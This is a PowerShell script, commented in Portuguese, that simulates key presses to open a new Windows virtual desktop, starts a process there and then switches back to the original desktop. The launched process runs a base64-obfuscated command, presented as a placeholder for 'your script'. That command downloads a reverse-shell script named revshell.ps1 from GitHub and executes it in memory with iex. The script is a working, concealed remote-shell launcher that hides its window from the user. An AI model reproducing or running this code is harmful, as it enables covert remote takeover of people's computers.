# Adiciona a definição do método para criar uma nova área de trabalho virtual
$KeyShortcut = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + D: Create a new desktop
public static void CreateVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
    //Key up
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name CreateVirtualDesktop -UsingNamespace System.Threading -PassThru

# Cria uma nova área de trabalho virtual
$KeyShortcut::CreateVirtualDesktopInWin10()

# Aguarda um pouco para garantir que a nova área de trabalho foi criada
Start-Sleep -Seconds 2

# Executa o script PowerShell desejado na nova área de trabalho
# Substitua o caminho abaixo pelo caminho do seu script PowerShell
Start-Process powershell.exe -ArgumentList "-NoExit -Command powershell -encodedCommand aQB3AHIAIAAtAHUAcwBlAGIAIAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBvAGQAZQByAEQAaQBhAHMALwByAGUAdgBlAHIAcwBlAF8AcwBoAGUAbABsAHMALwBtAGEAaQBuAC8AcgBlAHYAcwBoAGUAbABsAC4AcABzADEAJwAgAHwAIABpAGUAeAA=" 
#Start-Process calc.exe

# Aguarda a conclusão do script
Start-Sleep -Seconds 2

# Adiciona a definição do método para alternar para a área de trabalho anterior
$KeySwitch = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT ARROW: Switch to the previous desktop
public static void SwitchToPreviousDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT ARROW
    //Key up
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchToPreviousDesktop -UsingNamespace System.Threading -PassThru

# Alterna de volta para a área de trabalho anterior
$KeySwitch::SwitchToPreviousDesktopInWin10()
